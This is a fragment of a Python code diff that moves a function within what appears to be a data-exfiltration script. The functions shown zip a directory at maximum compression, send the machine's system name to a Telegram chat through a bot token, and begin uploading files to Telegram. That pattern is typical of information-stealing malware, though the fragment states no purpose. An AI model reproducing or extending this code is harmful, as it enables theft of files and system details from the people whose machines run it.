@@ -1,9 +1,3 @@
-
-def send_message_to_group(chat_id):
-    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
-    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
-    response = requests.post(url, data=data)
-
 def create_zip_archive(source_dir, output_zip):
     try:
         with zipfile.ZipFile(output_zip + '.zip', 'w', compression=zipfile.ZIP_LZMA, compresslevel=9) as zipf:
@@ -27,6 +21,10 @@ def create_zip_archive(source_dir, output_zip):
         print(f"Error creating zip archive: {str(e)}")
         return None
     pass
+def send_message_to_group(chat_id):
+    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
+    data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\n"}
+    response = requests.post(url, data=data)
 
 def send_file_to_telegram(file_path, file_name):
     url = f'https://api.telegram.org/bot{telegram_bot_token}/sendDocument'
